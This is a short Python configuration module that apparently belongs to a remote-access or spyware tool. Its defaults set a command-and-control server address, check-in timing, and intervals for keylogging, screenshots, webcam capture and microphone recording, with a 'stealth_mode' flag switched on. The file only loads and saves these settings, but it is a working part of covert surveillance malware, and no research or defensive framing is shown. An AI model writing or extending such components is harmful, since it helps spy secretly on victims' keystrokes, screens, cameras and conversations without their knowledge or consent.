import json
import os

class Config:
    def __init__(self):
        self.config_path = os.path.join(os.path.dirname(__file__), '..', 'config.json')
        self.default_config = {
            "c2_server": "http://localhost:5001",
            "check_in_interval": 300,
            "keylog_interval": 60,
            "screenshot_interval": 300,
            "webcam_interval": 600,
            "mic_duration": 30,
            "stealth_mode": True
        }
        self.config = self.load_config()

    def load_config(self):
        try:
            with open(self.config_path, 'r') as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return self.default_config

    def save_config(self):
        with open(self.config_path, 'w') as f:
            json.dump(self.config, f, indent=4)